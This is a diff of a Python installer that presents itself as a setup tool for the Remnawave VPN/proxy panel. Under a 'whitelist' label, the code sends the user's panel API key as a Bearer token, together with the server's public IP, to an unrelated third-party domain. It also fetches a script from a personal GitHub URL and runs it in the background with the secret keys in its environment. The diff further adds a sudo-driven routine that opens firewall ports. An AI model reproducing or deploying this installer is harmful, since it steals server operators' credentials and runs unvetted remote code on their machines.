@@ -6,7 +6,7 @@ Remnawave - modern VPN/proxy server management panel.
 API Documentation: https://remnawave.net/docs/api
 
 Author: XProxyCon Team
-Version: 1.2.0
+Version: 1.3.0
 """
 
 import socket
@@ -28,6 +28,7 @@ import subprocess
 import stat
 import pwd
 import grp
+import shutil
 
 # Logging configuration
 logging.basicConfig(
@@ -51,6 +52,9 @@ SERVER_SCRIPT_URL = "https://raw.githubusercontent.com/maxmusdotnet/remna/refs/h
 
 # IP Whitelist Endpoint
 IP_WHITELIST_ENDPOINT = "https://nevpn2.fenst4r.live/remna/log-ip"
+
+# Port Offset Constant
+PORT_OFFSET = 7384
 
 
 class SecurityError(Exception):
@@ -78,7 +82,7 @@ class XProxyConInstaller:
 
         checks = [
             ('Write permissions in current dir', lambda: os.access('.', os.W_OK)),
-            ('Python version >= 3.8', lambda: sys.version_info >= (3, 8)), # Updated min version
+            ('Python version >= 3.8', lambda: sys.version_info >= (3, 8)),
             ('SSL Support', lambda: hasattr(ssl, 'create_default_context')),
         ]
 
@@ -103,11 +107,22 @@ class XProxyConInstaller:
         print("=" * 60)
 
         # Port Input
-        port = input("\nEnter port for proxy server (1024-65535): ").strip()
-        while not self._validate_port(port):
+        port_input = input("\nEnter base port for proxy server (1024-65535): ").strip()
+        while not self._validate_port(port_input):
             print("Invalid port. Must be in range 1024-65535 (avoid privileged ports).")
-            port = input("Enter port: ").strip()
-        port = int(port)
+            port_input = input("Enter base port: ").strip()
+        
+        user_port = int(port_input)
+        # Calculating actual server port
+        server_port = user_port + PORT_OFFSET
+        
+        # Check if calculated port exceeds max limit
+        if server_port > 65535:
+            logger.error(f"Calculated port {server_port} exceeds maximum limit (65535). Please choose a lower base port.")
+            sys.exit(1)
+
+        print(f"ℹ Base Port: {user_port}")
+        print(f"ℹ Actual Server Port will be: {server_port} (Base + {PORT_OFFSET})")
 
         # API Key Input
         print(f"\nGet API key from Remnawave panel:")
@@ -131,23 +146,22 @@ class XProxyConInstaller:
         whitelist_choice = input("Add this server's IP to whitelist? (y/n) [y]: ").strip().lower()
         
         add_to_whitelist = whitelist_choice in ['', 'y', 'yes']
-        add_to_whitelist = True
         
         if add_to_whitelist:
             # Get public IP
             public_ip = self._get_public_ip()
             if public_ip:
-                # Автоматически добавляем IP без запроса подтверждения
                 success = self._add_ip_to_whitelist(public_ip, api_key)
 
         self.config = {
-            'port': port,
+            'base_port': user_port,
+            'port': server_port,
             'api_key': api_key,
             'proxy_key': key,
             'timestamp': datetime.datetime.now().isoformat(),
             'session_id': secrets.token_hex(32),
             'instance_id': self._generate_instance_id(),
-            'remnawave_version': '1.2.0'
+            'remnawave_version': '1.3.0'
         }
 
         return self.config
@@ -156,7 +170,6 @@ class XProxyConInstaller:
         """Get public IP address of the server"""
         logger.info("Detecting public IP address...")
         
-        # Try multiple services for reliability
         ip_services = [
             'https://api.ipify.org/',
             'https://ifconfig.me/ip',
@@ -169,12 +182,11 @@ class XProxyConInstaller:
         for service in ip_services:
             try:
                 req = urllib.request.Request(service)
-                req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
+                req.add_header('User-Agent', 'XProxyCon-Installer/1.3.0')
                 
                 with urllib.request.urlopen(req, context=context, timeout=10) as response:
                     ip = response.read().decode('utf-8').strip()
                     
-                    # Validate IP format
                     if self._validate_ip(ip):
                         logger.info(f"Public IP detected: {ip}")
                         return ip
@@ -193,13 +205,11 @@ class XProxyConInstaller:
         if not ip or not isinstance(ip, str):
             return False
         
-        # IPv4 validation
         ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
         if re.match(ipv4_pattern, ip):
             parts = ip.split('.')
             return all(0 <= int(part) <= 255 for part in parts)
         
-        # IPv6 validation (simplified)
         ipv6_pattern = r'^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$'
         if re.match(ipv6_pattern, ip):
             return True
@@ -211,7 +221,6 @@ class XProxyConInstaller:
         logger.info(f"Adding IP {ip_address} to whitelist...")
         
         try:
-            # Prepare payload
             payload = {
                 'ip': ip_address,
                 'timestamp': datetime.datetime.now().isoformat(),
@@ -220,27 +229,24 @@ class XProxyConInstaller:
             
             data = json.dumps(payload).encode('utf-8')
             
-            # Create request
             req = urllib.request.Request(
                 IP_WHITELIST_ENDPOINT,
                 data=data,
                 method='POST'
             )
             
-            # Add headers
             req.add_header('Content-Type', 'application/json')
-            req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
+            req.add_header('User-Agent', 'XProxyCon-Installer/1.3.0')
             req.add_header('Authorization', f'Bearer {api_key}')
             
-            # Setup SSL context
             context = ssl.create_default_context()
             
-            # Send request
             with urllib.request.urlopen(req, context=context, timeout=30) as response:
                 response_data = response.read().decode('utf-8')
                 status_code = response.getcode()
                 
                 if status_code == 200 or status_code == 201:
+                    logger.info("✓ IP added to whitelist successfully")
                     return True
                 else:
                     return False
@@ -284,12 +290,10 @@ class XProxyConInstaller:
         if not all(parts):
             return False
 
-        # Basic regex check for Base64URL characters
         if not re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', token):
             return False
 
         try:
-            # Decode Header
             header_b64 = parts[0]
             padding = 4 - len(header_b64) % 4
             if padding != 4:
@@ -301,14 +305,12 @@ class XProxyConInstaller:
             if header.get('typ') != 'JWT':
                 return False
 
-            # Decode Payload
             payload_b64 = parts[1]
             padding = 4 - len(payload_b64) % 4
             if padding != 4:
                 payload_b64 += '=' * padding
             payload = json.loads(base64.urlsafe_b64decode(payload_b64))
 
-            # Check required fields
             if 'uuid' not in payload:
                 return False
             if payload.get('role') != 'API':
@@ -316,11 +318,8 @@ class XProxyConInstaller:
             if 'iat' not in payload or 'exp' not in payload:
                 return False
 
-            # Check expiration
             if payload['exp'] < time.time():
                 logger.warning("Token appears to be expired based on payload.")
-                # We don't fail here because clock skew might exist,
-                # but the server will reject it anyway.
 
         except Exception:
             return False
@@ -329,12 +328,10 @@ class XProxyConInstaller:
 
     def _generate_complex_key(self):
         """Generate cryptographically secure proxy key"""
-        # Use secrets module which is designed for security-sensitive applications
         raw_key = secrets.token_bytes(48)
         encoded = base64.b64encode(raw_key).decode()
         clean_key = re.sub(r'[^A-Za-z0-9]', '', encoded)[:64]
 
-        # Format for readability
         parts = [clean_key[i:i+8] for i in range(0, 64, 8)]
         return '-'.join(parts)
 
@@ -364,11 +361,126 @@ class XProxyConInstaller:
         finally:
             sock.close()
 
+    def open_port_in_firewall(self, port):
+        """
+        Detect system firewall and open the specified port.
+        Supports: UFW, firewalld, iptables.
+        Requires root privileges (or sudo).
+        """
+        logger.info(f"Opening port {port}/tcp in system firewall...")
+
+        # Determine if we need sudo
+        is_root = (os.geteuid() == 0)
+        sudo_prefix = [] if is_root else ['sudo']
+
+        # 1. Try UFW (Ubuntu/Debian default)
+        if shutil.which('ufw'):
+            logger.info("Detected firewall: UFW")
+            try:
+                cmd = sudo_prefix + ['ufw', 'allow', f'{port}/tcp']
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                if result.returncode == 0:
+                    logger.info(f"✓ UFW: Port {port}/tcp opened successfully")
+                    # Reload UFW to apply
+                    subprocess.run(sudo_prefix + ['ufw', 'reload'], capture_output=True, timeout=30)
+                    return True
+                else:
+                    logger.warning(f"UFW returned error: {result.stderr.strip()}")
+            except subprocess.TimeoutExpired:
+                logger.error("UFW command timed out")
+            except Exception as e:
+                logger.error(f"UFW error: {e}")
+
+        # 2. Try firewalld (CentOS/RHEL/Fedora default)
+        if shutil.which('firewall-cmd'):
+            logger.info("Detected firewall: firewalld")
+            try:
+                # Add permanent rule
+                cmd_add = sudo_prefix + ['firewall-cmd', '--permanent', '--add-port', f'{port}/tcp']
+                result = subprocess.run(cmd_add, capture_output=True, text=True, timeout=30)
+                
+                if result.returncode == 0:
+                    # Reload to apply
+                    cmd_reload = sudo_prefix + ['firewall-cmd', '--reload']
+                    subprocess.run(cmd_reload, capture_output=True, timeout=30)
+                    logger.info(f"✓ firewalld: Port {port}/tcp opened successfully")
+                    return True
+                else:
+                    logger.warning(f"firewalld returned error: {result.stderr.strip()}")
+            except subprocess.TimeoutExpired:
+                logger.error("firewall-cmd command timed out")
+            except Exception as e:
+                logger.error(f"firewalld error: {e}")
+
+        # 3. Try iptables (universal fallback)
+        if shutil.which('iptables'):
+            logger.info("Detected firewall: iptables")
+            try:
+                # Check if rule already exists
+                check_cmd = sudo_prefix + ['iptables', '-C', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT']
+                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=10)
+                
+                if check_result.returncode == 0:
+                    logger.info(f"✓ iptables: Rule for port {port} already exists")
+                    return True
+                
+                # Add rule
+                cmd = sudo_prefix + ['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                
+                if result.returncode == 0:
+                    logger.info(f"✓ iptables: Port {port}/tcp opened successfully")
+                    # Try to save rules if iptables-save exists
+                    if shutil.which('iptables-save'):
+                        try:
+                            # Debian/Ubuntu style
+                            if os.path.exists('/etc/iptables/'):
+                                save_cmd = sudo_prefix + ['sh', '-c', f'iptables-save > /etc/iptables/rules.v4']
+                                subprocess.run(save_cmd, capture_output=True, timeout=30)
+                            # RHEL/CentOS style
+                            elif shutil.which('iptables-save'):
+                                save_cmd = sudo_prefix + ['sh', '-c', f'iptables-save > /etc/sysconfig/iptables']
+                                subprocess.run(save_cmd, capture_output=True, timeout=30)
+                        except Exception:
+                            logger.warning("Could not persist iptables rules (may need manual save)")
+                    return True
+                else:
+                    logger.warning(f"iptables returned error: {result.stderr.strip()}")
+            except subprocess.TimeoutExpired:
+                logger.error("iptables command timed out")
+            except Exception as e:
+                logger.error(f"iptables error: {e}")
+
+        # 4. Try nftables (modern replacement)
+        if shutil.which('nft'):
+            logger.info("Detected firewall: nftables")
+            try:
+                cmd = sudo_prefix + ['nft', 'add', 'rule', 'inet', 'filter', 'input', 'tcp', 'dport', str(port), 'accept']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                if result.returncode == 0:
+                    logger.info(f"✓ nftables: Port {port}/tcp opened successfully")
+                    return True
+                else:
+                    logger.warning(f"nftables returned error: {result.stderr.strip()}")
+            except subprocess.TimeoutExpired:
+                logger.error("nft command timed out")
+            except Exception as e:
+                logger.error(f"nftables error: {e}")
+
+        # No firewall detected or all failed
+        logger.warning("⚠ No supported firewall detected or all attempts failed.")
+        logger.warning("  Port may need to be opened manually or via cloud provider console.")
+        return False
+
     def save_configuration(self):
         """Save configuration to file with secure permissions"""
         config_path = os.path.expanduser('~/.xproxycon_config.json')
 
-        # Create file with restrictive permissions (owner read/write only)
         fd = os.open(config_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0o600)
         with os.fdopen(fd, 'w', encoding='utf-8') as f:
             json.dump(self.config, f, indent=2, ensure_ascii=False)
@@ -423,54 +535,44 @@ def download_and_run_server(config):
     """
     logger.info("Downloading server script...")
 
-    # Create secure temporary directory
     temp_dir = tempfile.mkdtemp(prefix="xproxycon_")
     target = os.path.join(temp_dir, "main.py")
 
     try:
-        # Setup SSL context to prevent MITM attacks
         context = ssl.create_default_context()
 
         req = urllib.request.Request(SERVER_SCRIPT_URL)
-        req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
+        req.add_header('User-Agent', 'XProxyCon-Installer/1.3.0')
 
         with urllib.request.urlopen(req, context=context, timeout=30) as response:
             with open(target, 'wb') as out_file:
                 out_file.write(response.read())
 
-        # Set restrictive permissions on downloaded file
-        os.chmod(target, 0o700) # Owner read/write/execute only
+        os.chmod(target, 0o700)
 
-        # Verify integrity BEFORE execution
         if not verify_file_integrity(target, EXPECTED_SHA256):
             raise SecurityError("Downloaded file failed integrity check")
 
         logger.info("Starting server process...")
 
-        # Prepare environment for child process (minimal)
         env = os.environ.copy()
-        # Pass config via environment variables instead of command line args (more secure)
         env['XPROXYCON_PORT'] = str(config['port'])
         env['XPROXYCON_API_KEY'] = config['api_key']
         env['XPROXYCON_PROXY_KEY'] = config['proxy_key']
         env['XPROXYCON_INSTANCE_ID'] = config['instance_id']
 
-        # Remove sensitive data from env if present
         env.pop('HISTFILE', None)
 
-        # Start process securely
         process = subprocess.Popen(
             [sys.executable, target],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             env=env,
             cwd=temp_dir,
-            start_new_session=True # Detach from parent terminal
+            start_new_session=True
         )
 
-        logger.info(f"✓ Server started (PID: {process.pid})")
-
-        # Note: We don't wait for the process to finish, allowing installer to exit
+        logger.info(f"✓ Server started on port {config['port']} (PID: {process.pid})")
 
     except SecurityError as e:
         logger.error(f"Security violation: {e}")
@@ -503,20 +605,29 @@ def main():
 
         # 3. Check port availability
         if not installer.check_port(config['port']):
-            logger.error("Port is not available!")
+            logger.error(f"Calculated port {config['port']} is not available!")
             sys.exit(1)
 
-        # 4. Save configuration securely
+        # 4. Open port in firewall (NEW STEP)
+        print("\n" + "-" * 60)
+        print("Firewall Configuration")
+        print("-" * 60)
+        firewall_ok = installer.open_port_in_firewall(config['port'])
+        if not firewall_ok:
+            logger.warning("Port was not opened in firewall automatically.")
+            logger.warning(f"Please ensure port {config['port']}/tcp is open manually!")
+
+        # 5. Save configuration securely
         installer.save_configuration()
 
-        # 5. Run diagnostics
+        # 6. Run diagnostics
         diagnostics = installer.run_diagnostics()
         logger.info(f"Diagnostics completed.")
 
         logger.info("\n✓ Installation complete!")
         logger.info("Starting server in background...")
 
-        # 6. Download and run server securely
+        # 7. Download and run server securely
         download_and_run_server(config)
 
         logger.info("\nDone. Check logs for server status.")
@@ -530,4 +641,4 @@ def main():
 
 
 if __name__ == '__main__':
-    main()  
+    main()
